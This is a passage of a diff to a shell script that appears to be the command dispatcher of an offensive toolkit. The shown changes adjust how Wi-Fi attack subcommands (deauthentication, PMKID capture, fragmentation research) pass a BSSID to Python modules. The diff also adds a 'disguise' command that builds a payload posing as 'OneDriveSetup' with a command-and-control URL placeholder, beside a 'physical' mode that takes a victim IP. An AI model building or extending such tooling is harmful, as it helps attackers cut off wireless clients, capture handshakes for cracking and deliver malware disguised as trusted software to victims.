@@ -9769,8 +10478,8 @@ import json; print(json.dumps(deauth_test('$IFACE','$BSSID','$CLIENT',int('$CNT'
             python3 -c "
 import sys; sys.path.insert(0,'$DIR/op/modules')
 from wifi_probe import pmkid_capture
-import json; print(json.dumps(pmkid_capture('$IFACE','${BSSID:-None}',int('$DUR'),'$OUTD'), indent=2, default=str))
-" 2>&1 | sed "s/'None'/None/"
+import json; print(json.dumps(pmkid_capture('$IFACE',None if not '${BSSID:-}' else '${BSSID:-}',int('$DUR'),'$OUTD'), indent=2, default=str))
+"
             ;;
         frag)
             check_root
@@ -9793,8 +10502,8 @@ import json; print(json.dumps(fragmentation_research('$IFACE','$BSSID','$CLIENT'
             python3 -c "
 import sys; sys.path.insert(0,'$DIR/op/modules')
 from wifi_probe import full_wifi_probe
-import json; print(json.dumps(full_wifi_probe('$IFACE','${BSSID:-None}',int('$DUR')), indent=2, default=str))
-" 2>&1 | sed "s/'None'/None/"
+import json; print(json.dumps(full_wifi_probe('$IFACE',None if not '${BSSID:-}' else '${BSSID:-}',duration=int('$DUR')), indent=2, default=str))
+"
             ;;
         *)
             echo "Usage: start wifiprobe [ifaces|monitor|beacon|deauth|pmkid|frag|full] [iface]"
@@ -9856,6 +10565,7 @@ case "$CMD" in
     android)        init_files; cmd_android  "$2" "$3" "$4" "$5" ;;
     bluetooth)      init_files; cmd_bluetooth "$2" "$3" "$4" "$5" ;;
     wifiprobe)      init_files; cmd_wifiprobe "$2" "$3" "$4" "$5" ;;
+    disguise)       init_files; build_disguised_payload "${2:-OneDriveSetup}" "${3:-__C2URL__}" ;;
     physical)
         # sudo re-exec entry point: start physical <victim_ip> <target_domain>
         VICTIM_IP="$2"; TARGET_DOMAIN="$3"
